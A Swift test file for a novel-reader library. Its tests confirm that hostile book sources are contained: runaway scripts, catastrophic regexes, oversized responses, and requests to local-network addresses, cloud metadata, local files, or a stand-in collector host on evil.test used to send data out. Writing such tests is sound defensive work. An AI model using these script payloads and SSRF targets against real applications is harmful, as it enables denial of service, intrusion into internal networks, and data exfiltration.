import Foundation
import Testing
@testable import NovelNestCore

/// Hostile or broken book sources: each test is an attack that once worked
/// (hang, crash, local-network access, memory) and must now fail safely.
struct AbuseTests {
    static func source(_ base: String = "https://books.example.com", search: String = "/s?q={{key}}",
                       list: String = "tag.li", replace: String? = nil) -> LegadoSource {
        LegadoSource(bookSourceUrl: base, bookSourceName: "probe", searchUrl: search,
                     ruleSearch: .init(bookList: list, name: "tag.a@text", bookUrl: "tag.a@href"),
                     ruleContent: .init(content: "id.c@html", replaceRegex: replace))
    }

    static func stub(_ body: String = "<ul><li><a href='/b/1'>书</a></li></ul><div id=c>正文</div>") -> StubFetcher {
        let stub = StubFetcher()
        for path in ["/s?q=a", "/c/1", "/x"] { stub.add("https://books.example.com" + path, body) }
        return stub
    }

    // MARK: Runaway scripts

    @Test(.timeLimit(.minutes(1)))
    func infiniteLoopIsStopped() async throws {
        #expect(ScriptWatchdog.isAvailable)
        let start = ContinuousClock.now
        await #expect(throws: WebSourceError.runawayScript("运行超过 5 秒")) {
            try await WebBookClient(source: Self.source(list: "@js:while(true){}"), fetcher: Self.stub()).search("a")
        }
        #expect(ContinuousClock.now - start < .seconds(8))
    }

    @Test(.timeLimit(.minutes(1)))
    func searchTimeoutDoesNotWaitForAStuckScript() async {
        let start = ContinuousClock.now
        var kinds: [SourceSearchEvent.Failure] = []
        for await event in WebSearch.searchAll([Self.source(list: "@js:while(true){}")], key: "a",
                                               fetcher: Self.stub(), timeout: .seconds(1)) {
            if case .failed(_, let kind) = event.outcome { kinds.append(kind) }
        }
        #expect(ContinuousClock.now - start < .seconds(3))
        #expect(kinds == [.failure])   // timed out; the script itself is stopped by the watchdog
    }

    @Test(.timeLimit(.minutes(1)))
    func requestLoopsAreCapped() async throws {
        let stub = Self.stub()
        await #expect(throws: WebSourceError.runawayScript("请求超过 30 次")) {
            try await WebBookClient(source: Self.source(list: "@js:for(;;){ java.ajax('https://books.example.com/x') }"),
                                    fetcher: stub).search("a")
        }
        // The search page plus at most 30 script requests.
        #expect(stub.requested.count <= 31)
        // Catching the error doesn't let the loop go on.
        let quiet = Self.stub()
        await #expect(throws: WebSourceError.self) {
            try await WebBookClient(source: Self.source(list: "@js:for(;;){ try { java.ajax('https://books.example.com/x') } catch (e) {} }"),
                                    fetcher: quiet).search("a")
        }
        #expect(quiet.requested.count <= 31)
    }

    @Test(.timeLimit(.minutes(1)))
    func cancelledScriptsStopRequesting() async throws {
        let stub = Self.stub()
        let client = WebBookClient(source: Self.source(list: "@js:for(;;){ java.ajax('https://books.example.com/x') }"), fetcher: stub)
        client.cancelScripts()
        await #expect(throws: (any Error).self) { try await client.search("a") }
        #expect(stub.requested.filter { $0.hasSuffix("/x") }.isEmpty)
    }

    @Test func recursionIsAnErrorNotACrash() async throws {
        await #expect(throws: WebSourceError.runawayScript("嵌套太深")) {
            try await WebBookClient(source: Self.source(list: "@js:function f(){ return java.getString('@js:f()') }; f()"),
                                    fetcher: Self.stub()).search("a")
        }
    }

    @Test func runawayErrorsTurnSourcesOff() {
        #expect(WebSearch.failureKind(WebSourceError.runawayScript("x")) == .runaway)
        #expect(WebSearch.failureKind(WebSourceError.rateLimited(retryAfter: nil)) == .temporary)
        #expect(WebSearch.failureKind(WebSourceError.blocked(403)) == .failure)
    }

    // MARK: Regular expressions

    @Test(.timeLimit(.minutes(1)), arguments: [#"(a|a)+$"#, #"(\w|a)+$"#, #"(a|aa)*b$"#, #"(.|\s)*x$"#])
    func catastrophicRegexIsStopped(pattern: String) async throws {
        let text = String(repeating: "a", count: 4000) + "!"
        let start = ContinuousClock.now
        #expect(throws: WebSourceError.self) {
            try RegexGuard.apply(.init(pattern: pattern, replacement: "", firstOnly: false), to: text)
        }
        #expect(ContinuousClock.now - start < .seconds(2))
    }

    @Test(arguments: [#"(a?){25}a{25}"#, #"(\d+)*$"#, #"(?:x+)+"#, #"(a)\1"#])
    func unsafePatternsAreRefused(pattern: String) {
        #expect(throws: WebSourceError.self) { try RegexGuard.regex(pattern) }
    }

    @Test(arguments: [#"(&nbsp;|\s)+"#, #"(?:本站|本章)未完.*"#, #"(\d+)?章"#, #"<(?i)br\s*/?>"#, #"第(\d+)章"#])
    func ordinaryPatternsStillWork(pattern: String) throws {
        #expect((try? RegexGuard.regex(pattern)) != nil)
    }

    @Test func replacementsAreUnchanged() throws {
        let replace = RuleSyntax.Replacement(pattern: #"第(\d+)章"#, replacement: "Chapter $1", firstOnly: false)
        #expect(try RegexGuard.apply(replace, to: "第1章 甲 第22章 乙") == "Chapter 1 甲 Chapter 22 乙")
        let first = RuleSyntax.Replacement(pattern: #"(\d+)"#, replacement: "<$1>", firstOnly: true)
        #expect(try RegexGuard.apply(first, to: "a12b34") == "<12>")
    }

    // MARK: Local network and other sites

    @Test(arguments: ["localhost", "127.0.0.1", "2130706433", "0x7f000001", "10.0.0.8", "172.20.1.1", "192.168.1.1",
                      "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "[::1]", "fe80::1", "fd12::3", "::ffff:192.168.0.1",
                      "router.local", "nas.lan", "printer"])
    func localAddressesAreNeverAllowed(host: String) {
        #expect(HostPolicy.isLocal(host))
        let policy = HostPolicy(source: Self.source("http://\(host)"))
        #expect(!policy.allows(URL(string: "http://\(host.contains(":") && !host.hasPrefix("[") ? "[\(host)]" : host)/")!))
    }

    @Test(arguments: ["books.example.com", "8.8.8.8", "m.site.com.cn", "a.github.io"])
    func publicAddressesAreNotLocal(host: String) {
        #expect(!HostPolicy.isLocal(host))
    }

    @Test func localSourcesAreUnsupported() {
        #expect(SourceCompatibility.check(Self.source("http://192.168.1.1")).reasons.contains("指向本机或局域网"))
    }

    @Test func searchURLCannotAddAnotherSite() {
        let source = Self.source("http://192.168.1.1", search: "https://collector.evil.test/s?q={{key}}")
        let policy = HostPolicy(source: source)
        #expect(!policy.allows(URL(string: "https://collector.evil.test/x")!))
        #expect(!policy.allows(URL(string: "http://192.168.1.1/admin")!))
        #expect(SourceCompatibility.check(Self.source(search: "https://collector.evil.test/s?q={{key}}"))
            .reasons.contains("搜索地址不在书源网站"))
        #expect(SourceCompatibility.check(Self.source(search: "https://m.example.com/s?q={{key}}")).isSupported)
    }

    @Test func sharedHostingSitesAreSeparate() {
        let policy = HostPolicy(source: Self.source("https://alice.github.io"))
        #expect(policy.allows(URL(string: "https://alice.github.io/book")!))
        #expect(!policy.allows(URL(string: "https://bob.github.io/")!))
    }

    @Test func scriptsCannotReachOtherHostsOrFiles() async throws {
        for url in ["file:///etc/hosts", "http://192.168.1.1/", "https://collector.evil.test/?d=x"] {
            let stub = Self.stub()
            _ = try? await WebBookClient(source: Self.source(list: "@js:java.ajax('\(url)'); '[]'"), fetcher: stub).search("a")
            #expect(stub.requested.allSatisfy { $0.hasPrefix("https://books.example.com/") }, "\(url)")
        }
    }

    @Test func coversFromOtherHostsAreDropped() async throws {
        let stub = StubFetcher()
        stub.add("https://books.example.com/s?q=a", """
        <ul><li><a href='/b/1'>甲</a><img src='http://192.168.1.1/pixel.gif'></li>
            <li><a href='/b/2'>乙</a><img src='https://tracker.evil.test/p.gif'></li>
            <li><a href='/b/3'>丙</a><img src='/cover/3.jpg'></li></ul>
        """)
        var source = Self.source()
        source.ruleSearch?.coverUrl = "tag.img@src"
        let results = try await WebBookClient(source: source, fetcher: stub).search("a")
        #expect(results.map(\.coverURL?.absoluteString) == [nil, nil, "https://books.example.com/cover/3.jpg"])
    }

    // MARK: Response size

    @Test func oversizedResponsesAreCutOff() async throws {
        let session = URLSession(configuration: StreamingProtocol.configuration)
        let request = URLRequest(url: URL(string: "https://big.example.com/")!)
        await #expect(throws: WebSourceError.tooLarge) {
            _ = try await session.limitedData(for: request, maxBytes: 1_000_000)
        }
        // Stopped well before the end (the test server outpaces real networks).
        #expect(StreamingProtocol.sent < StreamingProtocol.total * 3 / 4)
        let (data, _) = try await session.limitedData(for: request, maxBytes: 50_000_000)
        #expect(data.count == StreamingProtocol.total)
    }
}

/// Serves an 8 MB body in 64 KB chunks with no Content-Length, counting
/// what was handed to the client.
final class StreamingProtocol: URLProtocol, @unchecked Sendable {
    static let total = 8_000_000
    nonisolated(unsafe) static var sent = 0
    static var configuration: URLSessionConfiguration {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.protocolClasses = [StreamingProtocol.self]
        return configuration
    }

    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }
    private var stopped = false

    override func startLoading() {
        Self.sent = 0
        client?.urlProtocol(self, didReceive: HTTPURLResponse(url: request.url!, statusCode: 200, httpVersion: nil,
                                                              headerFields: ["Content-Type": "text/html"])!,
                            cacheStoragePolicy: .notAllowed)
        DispatchQueue.global().async {
            let chunk = Data(repeating: 0x61, count: 65_536)
            while !self.stopped, Self.sent < Self.total {
                let piece = chunk.prefix(Self.total - Self.sent)
                Self.sent += piece.count
                self.client?.urlProtocol(self, didLoad: piece)
                Thread.sleep(forTimeInterval: 0.001)
            }
            if !self.stopped { self.client?.urlProtocolDidFinishLoading(self) }
        }
    }

    override func stopLoading() { stopped = true }
}
